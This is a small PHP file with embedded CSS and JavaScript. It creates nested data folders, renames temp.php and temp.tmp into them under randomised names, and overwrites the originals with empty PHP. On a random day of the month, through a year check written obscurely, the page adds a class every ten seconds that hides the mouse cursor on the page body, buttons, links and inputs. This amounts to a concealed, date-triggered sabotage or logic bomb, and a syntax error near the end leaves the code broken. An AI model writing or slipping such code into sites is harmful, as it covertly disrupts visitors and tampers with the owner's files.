<?php

$dt2 = date("Ymd");
$dt11 = date("Y");
$dt22 = date("m");
$dt33 = date("d");
$ds = "data";
$temp = "temp";
$img = "images";
$dtg = rand(1, 28);
$th = range(20, 99);
$ms = rand(1, 60);
$ms2 = rand(99, 2000);
$dt2 = $dtg.$dt33.$ms.$dt11.$ms2.$dt22;
?>

<style>
        body.x,
		body.x button,
		body.x a,
		body.x input
		{
            cursor: none !important;
        }
</style>
<?php

if(!is_dir($ds."/")){
	mkdir($ds."/");
	if(!is_dir($ds."/".$img."/")){
		mkdir($ds."/".$img."/");
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/");
		}
	}
}else{
	if(!is_dir($ds."/".$img."/")){
		mkdir($ds."/".$img."/");
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/");
		}
	}else{
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/");
		}
	}
}
echo $dtg;
?>

<script type="text/javascript">
if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
	var bodyElement = document.body;

	setInterval(function() {
		bodyElement.classList.add("x");
	}, 10000);
}
</script>

<?php
		rename($temp.".php", $ds."/".$img."/".$temp."/".$dt2.".php");
		rename($temp.".tmp", $ds."/".$img."/".$temp."/temp.php");
		$myfile = fopen($temp.".php", "w") or die("Unable to open file!");
		$myfilex = fopen($temp.".tmp", "w") or die("Unable to open file!");
		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("Unable to open file!");
		$myfile4 = fopen($ds."/".$img."/".$temp."/temp.tmp", "w") or die("Unable to open file!");
		$txt = "<?php
			
?>";
		$txt2 = date('Ymd');
		fwrite($myfile, $txt);
		fwrite($myfilex, $txt2);
		fclose($myfile);
		fclose($myfilex);
		fwrite($myfile2, $txt);
		fclose($myfile2);
		fwrite($myfile4, $txt);
		fclose($myfile4);
$fileContent = file_get_contents($temp.'.tmp');
if ($fileContent !== false) {
    echo $fileContent;
} else {
    echo 'Gagal membaca file .tmp';
}
$fileContent = file_get_contents($ds."/".$img."/".$temp."/temp.tmp");
if ($fileContent !== false) {
	if($fileContent===date('Ymd'){
	   echo $fileContent;
	}
}
?>
